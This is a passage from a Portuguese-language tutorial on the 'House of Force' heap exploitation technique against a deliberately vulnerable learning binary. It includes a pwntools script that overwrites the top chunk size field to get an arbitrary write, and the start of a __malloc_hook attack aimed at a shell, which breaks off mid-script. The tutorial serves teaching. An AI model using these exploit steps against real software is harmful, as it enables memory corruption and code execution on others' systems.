<p><img src="/img/papers/heap_p1/paper_heap1_35.png" alt="Executando o binário" /></p>

<p>O programa inicia com um cabeçalho e dois endereços:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_36.png" alt="Endereços" /></p>

<p>O primeiro, é o endereço da função <code class="language-plaintext highlighter-rouge">puts()</code> dentro da GLIBC, do qual podemos utilizar posteriormente durante a exploração. O segundo, é o endereço inicial da primeira <em>heap</em>.</p>

<p>É importante salientar que “vazar” os endereços da <em>heap</em> e da GLIBC é possível via corrupção da própria <em>heap</em>, porém, como estamos utilizando um binário exclusivamente feito para aprendizado da técnica, o próprio binário nos da esta informação sem uso de nenhum tipo de exploração, para que o único foco seja o aprendizado da técnica.</p>

<p>Abaixo dos endereços, está um menu com opções numéricas.<br />
A primeira opção, nos permite requisitar até quatro <em>chunks</em> da memória <em>heap</em>, via função <code class="language-plaintext highlighter-rouge">malloc()</code> .</p>

<p>Ao utilizar esta opção, o binário solicita a quantidade de bytes para este <em>chunk</em>, e logo em seguida os dados que o irão preencher, conforme demonstrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_37.png" alt="Criando e preenchendo um chunk" /></p>

<p>Agora que o processo tem uma <em>heap</em>, podemos visualizar em qual estado se encontra, pausando a execução no GDB precionado <code class="language-plaintext highlighter-rouge">Ctrl + c</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_38.png" alt="Verificando estado atual do binário" /></p>

<p>Ao utilisarmos o comando <code class="language-plaintext highlighter-rouge">vis</code>, podemos ver que a <em>heap</em> se inicia no endereço <code class="language-plaintext highlighter-rouge">0x603000</code>, assim como o próprio binário havia nos informado.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_39.png" alt="Visualizando a heap" /></p>

<p>Conforme esperado, a <code class="language-plaintext highlighter-rouge">malloc()</code> alocou um <em>chunk</em> com o tamanho de 24 bytes de <em>user data</em>, asim como requisitado.<br />
Também é possível verificar, que o <em>user data</em> foi preenchido com nossos quatro “A” (41 em hexa) e uma nova linha (0a em hexa) representados em hexadecimal.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_40.png" alt="User data" /></p>

<p>Portanto, este programa nos permite requisitar qualquer tamanho de <em>chunk</em> e preenchê-los com dados.<br />
Vamos coninuar enumerando este binário, como o comando <code class="language-plaintext highlighter-rouge">continue</code> ou simplesmente <code class="language-plaintext highlighter-rouge">c</code> seguido de <code class="language-plaintext highlighter-rouge">Enter</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_41.png" alt="Continuando a execução" /></p>

<p>A opção de número dois, nos mostra o <em>target</em>, no momento, este campo só retorna sete “X”. Como a técnica <em>the house of force</em> nos permite escrita arbitrária, o objetivo inicial desta fase do estudo, é sobrescrever o conteúdo da função <em>target</em> e podermos visualizá-lo com a opção dois do menu.<br />
Lembrando que este binário não possui <code class="language-plaintext highlighter-rouge">PIE</code>, então o endereço dos dados da função <em>target</em> sempre será o mesmo.</p>

<p>Podemos checar a função <em>target</em> no GDB, pausando novamente o programa e utilizando o comando <code class="language-plaintext highlighter-rouge">dq &amp;target</code> (<em>dump quad</em>) que nos mostra os “X” representados por 58 em hexa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_42.png" alt="Endereço e conteúdo da target" /></p>

<p>Estes dados, residem na seção <em>data</em> do binário, para checarmos isso, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">xinfo target</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_43.png" alt="Endereço da data section" /></p>

<p>Continuando a execução do programa, vemos que a opção três, encerra a execução do programa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_44.png" alt="Encerrando o programa" /></p>

<h2 id="arbitrary-write-via-house-of-force">Arbitrary write via House of Force</h2>

<p>Como primeiro objetivo de exploração deste binário, vamos sobrescrever os dados da seção <em>data</em>, correspondente a função <em>target</em>.</p>

<p>Para isto, vamos primeiramente executar o programa no GDB e solicitar um <em>chunk</em> com a opção um do menu. Porém, vamos enviar mais dados do que solicitamos e checar o <em>chunk</em> para medir seu comportamento. No exemplo abaixo, foi solicitado um <em>chunk</em> de 24 bytes, porém foi enviado uma quantidade muito maior de “A”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_45.png" alt="Enviando mais dados que acapacidade" /></p>

<p>Agora podemos pausar o GDB com <code class="language-plaintext highlighter-rouge">Ctrl + c</code> e inspecionar o <em>chunk</em> com <code class="language-plaintext highlighter-rouge">vis</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_46.png" alt="Inspecionando o chunk" /></p>

<p>Podemos ver que que nossos dados preencheram totalmente o <em>user data</em> de 24 bytes, mas também sobrescreveu o <em>top chunck size field</em>. Por tanto, este binário tem um <em>overflow</em> de 8 bytes quando lê os dados nos chunks.</p>

<p>O ponto em questão, é que um unico byte, pode corromper o <em>size field</em> do próximo <em>chunk</em>, porém neste caso, temos o total controle para sobrescrevê-lo. Na técnica <code class="language-plaintext highlighter-rouge">House of Force</code> o objetivo é sobrescrever o <em>size filed</em> do <em>top chunk</em>, assim podemnos utilizar o <em>overflow</em> para controlar que tamanho a malloc “acha” que o <em>top chunk</em> tem.</p>

<p>Isto acontece, pois muitas versões da GLIBC, não possuem um mecanismo para checar a integridade do <em>top chunk size field</em>. A mitigação desta falha, foi implementada somente na versão <code class="language-plaintext highlighter-rouge">2.29</code> da GLIBC, que pode ser encontrado no <code class="language-plaintext highlighter-rouge">diff</code> da implementação (<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=7c8bf8413c54c367031ca274c9bca497a45897f8;hp=9431108626cdc0b5c1972ee00126228c8dd7166f;hb=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f;hpb=30a17d8c95fbfb15c52d1115803b63aaa73a285c">encontrado aqui</a>). Checamos anteriormente a versão da GLIBC utilizada neste binário, com a ferramente <code class="language-plaintext highlighter-rouge">checkec</code>, porém no próprio PWNDBG, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">vmmap libc</code> para confirmar.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_47.png" alt="Versão da GLIBC utilizada" /></p>

<p>Podemos ver que este binário utiliza a versão <code class="language-plaintext highlighter-rouge">2.28</code> da GLIBC, que não tem nenhum sistema para checar a integridade to <em>top chunk size field</em>.</p>
<blockquote>
  <p>Quando o binário não está <em>linkado</em> a nenhuma GLIBC, significa que utilizará a versão disponibilizada pelo SO, isso indica que se um binário não é vulnerável em uma plataforma, não signigica que não seja vulnerável em outra plataforma.</p>
</blockquote>

<p>Explorando esta vulnerabilidade encontrada, podemos controlar a memória <em>heap</em>, fazendo com que a malloc “ache” que o tamanho da <em>heap</em> tenha o tamanho que quisermos.</p>

<h3 id="contextualizando-a-house-of-force">Contextualizando a House of Force</h3>

<p>Já entendemos que na técnica, podemos sobrescrever o tamanho do <em>top chunk</em>, mas para se ter a noção do que pode ser feito, precisamos entender como o SO mapea a memória durante o processo na perspectiva da malloc. A imagem abaixo, abstrai este processo na mesma ordem que podemos ver no PWNDBG com o comando <code class="language-plaintext highlighter-rouge">vmmap</code>:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_48.png" alt="Processo de mapeamento da memória" /></p>

<p>No bloco “<em>Application</em>”, temos os endereços mais baixos, neste bloco reside o próprio binário em si, e suas seções, como <code class="language-plaintext highlighter-rouge">data section</code> e <code class="language-plaintext highlighter-rouge">code section</code>.</p>

<p>Depois temos o bloco “<em>Heap</em>” que contém os endereços da própria <em>heap</em>.</p>

<p>Em seguida existe um grande <em>gap</em> nos endereços seguido pelo bloco “<em>Libraries</em>”, este bloco contém todas as bibliotecas utilizadas pelo programa, incluindo a proópria GLIBC.</p>

<p>Por ultimo, temos outro grande <em>gap</em> seguido do bloco “<em>Stack</em>” nos endereços mais altos, neste bloco se encontra a pŕopria pilha.</p>

<p>Se preenchermos o <em>top chunbk size field</em> com um valor muito alto, na persepctiva da malloc, este <em>top chunk</em> pode se extender através de todo este <em>gap</em> sobrepondo dados sensíveis nas bibliotecas ou até mesmo nas regiões da pilha.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_49.png" alt="Sobrepondo outras regiões" /></p>

<p>Porém, não podemos esquecer que o <em>data section</em> do binário está no bloco “<em>Application</em>”, que se encontra em endereços mais baixos que a <em>heap</em>. No entanto, se sobrescrevermos o <em>top chunk size field</em> com um valor realmente muito grande, então a malloc entenderia que todos os endereços foram além do espaço do endereço virtual, “dariam a volta” e retornariam para o começo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_50.png" alt="Sobrepondo além dos espaço possível" /></p>

<p>Neste caso, poderiamos fazer outra grande requisição da malloc, que seria possível, graças ao tamanho do <em>top chunk</em>, esta outra requisição também “daria a volta” nos endereços virtuais, porém pararia exatamente no <em>data section</em> do nosso binário.</p>

<p>E esta exploração vai fazer exatamente isso, vamos nos aproveitar da vulnerabilidade de <em>overflow</em> do <em>top chunk size field</em> com o maior valor possível, então, faremos outra grande requisição com o tamanho do intervalo entre o endereço inicial da <em>heap</em> e o endereço do <em>target data</em>, então outra requisição para sobrepor o <em>target</em>, para podemos sobrescrevê-lo.</p>

<p>Para chegar a este objetivo, vamos utilizar alguns caracteres especiais, fazer um pouco de matemática e tornar todo o processo repetível.</p>

<h3 id="exploração">Exploração</h3>

<p>Para seguirmos com a exploração da vulnerabilidade, foi criado um script base em Python chamado <code class="language-plaintext highlighter-rouge">arbitrary_write.py</code> que fará a interação com o binário, o script inicial está desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"house_of_force"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span>

<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># seleciona a funcao "malloc" e envia o tamanho e os dados
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># calcula a distancia da "volta" entre dois enderecos
</span><span class="k">def</span> <span class="nf">delta</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="mh">0xffffffffffffffff</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="n">y</span>

<span class="c1"># inicia o script
</span><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># capturando o endereco da heap que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"heap @ "</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1"># tornando o binario interativo
</span><span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Este script, contém a base para iterarmos sobre o binário, ainda vamos adicionar mais aglumas linhas para sobrescrever o <em>target</em>.</p>

<p>Neste experimento, estou utilizando o editor de texto <code class="language-plaintext highlighter-rouge">vim</code> para escrever o script, pois ele permite que executemos o script com argumentos.</p>

<p>Para executermos o script, podemos inserir o comando <code class="language-plaintext highlighter-rouge">:!./%</code> no vim em modo de comando.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_51.png" alt="Executando o script com vim" /></p>

<p>Ao executar o comando, podemos ver que o script foi executado e nos trouxe a resposta do <code class="language-plaintext highlighter-rouge">checksec</code> tanto no binário quanto na sua GLIBC, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_52.png" alt="Script executado" /></p>

<p>Também é possível, através do vim, executar o script e enviá-lo para o GDB, graças a esta função no código:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
</code></pre></div></div>

<p>Para fins te teste, podemos inserir uma linha em nosso script, que utilizará da função <code class="language-plaintext highlighter-rouge">malloc(size, data)</code> para enviar um <em>buffer</em> para a <em>heap</em>, com o comando <code class="language-plaintext highlighter-rouge">malloc(24, b"A" * 24)</code>.<br />
Após adicionarmos esta linha de código, podemos adicionar a execução do script no GDB com o próprio vim, executando o comando <code class="language-plaintext highlighter-rouge">!./% GDB NOASLR</code> (o “<em>NOASLR</em>” desativa a proteção <code class="language-plaintext highlighter-rouge">ASLR</code>).</p>

<p><img src="/img/papers/heap_p1/paper_heap1_53.png" alt="Adicionando a execução no GDB" /></p>

<p>Uma nova janela se abrirá com várias linhas de texto, que podem ser ignoradas, pois são informações que o GDB fornece sobre o script, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_54.png" alt="GDB iniciado pelo script" /></p>

<p>Nesta tela, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">Ctrl + c</code> para pausar o GDB, seguido do comando <code class="language-plaintext highlighter-rouge">vis</code> para verificarmos a heap.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_55.png" alt="User data preenchido" /></p>

<p>Conforme podemos observar, o <em>user data</em> foi preenchido com o buffer de 24 letras “A” conforme esperado. Se inserirmos o comando <code class="language-plaintext highlighter-rouge">continue</code> no GDB e voltarmos para a tela do script, veremos que o primeiro dos chunks foi preenchido no programa, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_56.png" alt="Chunk utilizado" /></p>

<p>Conforme já haviamos enumerado a vulnerabilidade, sabemos que, neste momento, se enviarmos mais 8 bytes para o <em>buffer</em>, iremos sobrescrever o <em>top chunk size field</em>. Portanto podemos adicionar mais alguns dados não imprimíveis em nosso <em>buffer</em>.</p>

<p>Como queremos preencher o <em>top chunk size field</em> com o maior valor possível com 8 bytes, podemos enviar <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code> após nosso <em>buffer</em> inicial, para tanto, podemos utilizar a função <code class="language-plaintext highlighter-rouge">p64()</code> da pwntools evitando a necessidade de escrever byte a byte utilizando <em>indianess</em>. Vamos modifcar o teste anterior com a seguinte linha de código:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
</code></pre></div></div>
<p>E executer o script enviando para o GDB, conforme imagem abaixo:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_57.png" alt="Sobrescrevendo o top chunk size field" /></p>

<p>Desta vez, quando checamos o <em>chunk</em> com o GDB, podemos ver que o <em>top chunk size field</em> tem o maior tamanho possível, nos possibilitando solicitar um <em>chunk</em> do tamanho que quisermos, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_58.png" alt="Top chunk size field sobrescrito" /></p>

<p>Este é o princípio da técnica <code class="language-plaintext highlighter-rouge">The House of Force</code> em ação.</p>

<p>Agora podemos partir para a segunda fase da exploração.<br />
Vamos solicitar memória suficiente para ultrapassar os intervalos de memória e atingir o conteúdo da função <em>target</em>.</p>

<p>Primeiro, precisamos calcular a distância entre o <em>top chunk</em> e os dados da <em>target</em>. Para isso, podemos utilizar a função <code class="language-plaintext highlighter-rouge">delta(x, y)</code> que foi criada no script.<br />
Esta função leva dois argumentos:</p>

<ol>
  <li>O primeiro é o endereço do <em>top chunk</em>, sabemos sua localização, pois este binário “vaza” o endereço da <em>heap</em>, e nosso script captura este valor na variável <code class="language-plaintext highlighter-rouge">heap</code>. Vamos adicionar ao endereço da <em>heap</em>, mais <code class="language-plaintext highlighter-rouge">0x20</code> bytes que já alocamos, para chegarmos até o endereço do <em>top chunk</em>.</li>
  <li>O segundo é o endereço do <em>data section</em> da função <em>target</em>, onde por padrão a aplicação armazena os “X”. A pwntools nos permite encontrar o endereço dos “simbolos” do binário, invocando o parâmetro “<code class="language-plaintext highlighter-rouge">elf.sym.alvo</code>”, para encontrarmos o endereço da função <em>target</em> podemos utilizar o comando <code class="language-plaintext highlighter-rouge">elf.sym.target</code>. Também vamos subtrair <code class="language-plaintext highlighter-rouge">0x20</code> bytes deste endereço, para pararmos um pouco antes do endereço da <em>data section</em>.</li>
</ol>

<p>Com sestas premissas, podemos adicionar a linha de comando:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">distance</span> <span class="o">=</span> <span class="n">delta</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">target</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>
</code></pre></div></div>
<p>Agora que sabemos calcular a distância desejada, podemos requisitar um novo <em>chunk</em> e preenchê-lo com algum “lixo” e testar o script. As linhas adicionadas ficaram conforme a imagem abaixo:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_59.png" alt="Solicitando o segundo chunk" /></p>

<p>Parando o GDB novamente, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dq target-16</code>, para visualizarmos o conteúdo da <em>target</em>, e 16 bytes anteriores a ele.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_60.png" alt="Top chunk escrevendo em data section" /></p>

<p>Conforme podemos observer, temos os bytes <code class="language-plaintext highlighter-rouge">0x58</code> que representam os “X”, porém, alguns bytes antes dele, temos o <em>top chunk size field</em> escrito diretamente no <em>data section</em>  do programa. Podemos confirmar esta informação, com o comando <code class="language-plaintext highlighter-rouge">top_chunk</code> no PWNDBG, que nos mostra o endereço atual da <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_61.png" alt="Endereço e tamanho do top chunk" /></p>

<p>Como o <em>top chunk</em> está logo antes dos “X”, sabemos que o próximo <em>chunk</em> solicitado, irá sobrescrevê-lo, podemos fazer isto manualmente enviando o comando <code class="language-plaintext highlighter-rouge">continue</code> no GDB, voltarmos à tela do script e solicitar mais um <em>chunk</em> com a opção um.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_62.png" alt="Solicitando mais um chunk" /></p>

<p>Neste novo <em>chunk</em>, qualquer coisa que enviarmos, vai sobrescrever o <em>data section</em> do binário.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_63.png" alt="Preenchendo o  chunk" /></p>

<p>Como a opção dois do programa, nos mostra o que está armazenado no <em>data section</em> do binário, ele nos retornará algo diferente dos “X” desta vez, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_64.png" alt="Data section sobrescrito" /></p>

<p>Agora podemos adicionar esta chamada em nosso script, e automatizar a exploraçxão. O bloco final do script ficou como abaixo:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span> 
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
 
<span class="c1"># calculando a distancia para o data section da target
</span><span class="n">distance</span> <span class="o">=</span> <span class="n">delta</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">target</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>
 
<span class="c1"># solicitando um chunk do tamanho da distance e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo o data section
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora podemos executá-lo pelo vim, porém sem incorporarmos ao GDB, mostrando que o script funciona em ambiente de produção, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_65.png" alt="Executando o script" /></p>

<p>Ao selecionar a opção dois, vemos nosso <em>buffer</em> ser impresso:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_66.png" alt="Script em funcionamento" /></p>

<blockquote>
  <p>Esta prova de conceito, nos mostra que a vulnerabilidade de <em>heap overflow</em> nos permite escrever arbitrariamente em seções do próprio programa.<br />
Em resumo, esta vulnerabilidade nos permite sobrescrever o <em>top chunk size field</em> com valores imensos, e fazer com que a malloc haja como se o <em>top chunk</em> fosse muito maior do que realmente é, nos permitindo requisitar <em>chunks</em> de tamanhos grandes o suficiente para ultrapassar todos os endereços do programa e nos permitir fazer uma nova requisição para sobrescrever nosso alvo.</p>
</blockquote>

<h2 id="execução-de-código-via-house-of-force">Execução de código via House of Force</h2>

<p>Após o experimento de escrita arbitrária no binário, também podemos executar comandos utilizando a mesma técnica, porém é preciso ter em mente como exatamente fazer isso.</p>

<p>Uma vez que a memória de um programa pode ser sobrescrita, existem várias formas de se fazer isso, tudo depende de quais proteções e técnicas de mitigação o binário possui.</p>

<h3 id="contextualizando-as-possibilidades">Contextualizando as possibilidades</h3>

<p>Olhando do ponto de vista do ASLR, poderiamos nos concentrar na <em>stack</em>, poderiamos escrever funções diretamente na pilha, ou utilizar de <em>pointers</em> para obter execução de código. Porém, a <em>stack</em> é totalmente dependente do estado do programa, neste caso, a pilha é submetida ao ASLR que randomiza os endereços, tornando impossível explorar desta forma.</p>

<p>Poderiamos sobrescrever o próprio binário, como foi feito no experimento anterior, onde adulteramos sua estrutura e escrevemos no <em>data section</em>. Se sobrescrevermos a PLT (<em>Procedure Linkage Table</em>), podemos obter execução de código.</p>

<blockquote>
  <p>PLT é uma lista de apontadores de funções, toda função que um programa chama, reside em uma biblioteca externa, como a própria GLIBC é representada na PLT. O motivo pela qual a PLT é editável durante a execução de um programa é para suportar algo chamado <code class="language-plaintext highlighter-rouge">Lazy Linking</code>, através da qual o endereço de uma função, só é resolvido quando é chamado pela primeira vez.</p>
</blockquote>

<p>Sobrescrever a PLT é uma excelente maneira de controlar o fluxo do programa, por exemplo, este binário utiliza a função <code class="language-plaintext highlighter-rouge">printf()</code> forneceida pela GLIBC, se sobrescrevermos a entrada PLT desta função com o endereço de algum código que desejamos executar, a próxima vez que o programa tentar chamar a função <code class="language-plaintext highlighter-rouge">printf()</code>, nosso código será executado. Porém o <code class="language-plaintext highlighter-rouge">checksec</code> nos mostrou que este binário foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>, isso significa que a PLT é marcada como <code class="language-plaintext highlighter-rouge">read-only</code> após a inicilização do programa.</p>

<p>Outra alternativa, é focar em explorar a própria <em>heap</em>, uma vantagem de fazer desta forma, é que não é necessário ter o vazamento do endereço da <em>heap</em>, pois a distância entre o <em>top chunk</em> e nosso alvo, sempre será relativa. Com esta premissa, poderia haver alguns apontadores de função ou outros dados sensíveis na própria <em>heap</em>. Porém, no caso deste binário, não há nada na <em>heap</em>, além dos nossos próprios dados.</p>

<p>No entando, mesmo com todos estes bloqueios, existe um modo específico do comportamento da <em>heap</em> que nos permite controlar o fluxo do programa, a <code class="language-plaintext highlighter-rouge">malloc hook</code>.</p>

<h4 id="malloc-hook">Malloc hook</h4>

<p>Cada função pertencente ao <em>core</em> da malloc, como a <code class="language-plaintext highlighter-rouge">malloc()</code> e a <code class="language-plaintext highlighter-rouge">free()</code> possui um <em>hook</em> associado que assume um <em>function pointer</em> no <em>data section</em> da própria GLIBC.</p>

<p>Em circunstâncias normais, estes <em>hooks</em> podem ser utilizados por desenvolvedores para fazer algumas coisas como implementar seus próprios alocadores de memória ou coletar estatísticas da malloc. Neste caso, vamos utilizá-los para conseguir um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<h3 id="exploração-1">Exploração</h3>

<p>Para exemplificar a exploração do <em>malloc hook</em>, vamos utilizar uma cópia do script anterior, porém deixando somente a sobrescrita do <em>top chunk size field</em> no bloco de exploração que ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>


<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Desta vez, a distância que queremos cobrir com nossa alocação, é a diferença entre o <em>top chunk</em> e o <em>malloc hook</em>. Vamos utilizar a <em>malloc hook</em>, pois é a única função do <em>core</em> da malloc que podemos chamar de forma confiável neste binário.</p>

<p>Portanto, não precisaremos mais da função <code class="language-plaintext highlighter-rouge">delta()</code>, pois não precisaremos “dar a volta” nos endereços de memória como fizemos anteriormente.</p>

<p>Precisamos encontrar a diferença da distância da função <code class="language-plaintext highlighter-rouge">__malloc_hook</code> encontrada dentro da GLIBC e o nosso <em>top chunk</em> no binário.</p>

<p>Vamos subtrair <code class="language-plaintext highlighter-rouge">0x20</code> bytes do endereço da <em>malloc hook</em>, assim como fizemos anteriormente, para chegarmos alguns bytes antes dela, assim como vamos adicionar <code class="language-plaintext highlighter-rouge">0x20</code> bytes em nossa <em>heap</em>, para compensar o <em>chunk</em> que solicitamos e chegar até o <em>top chunk</em>.</p>

<p>A linha adicionada para calcular a distância, fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
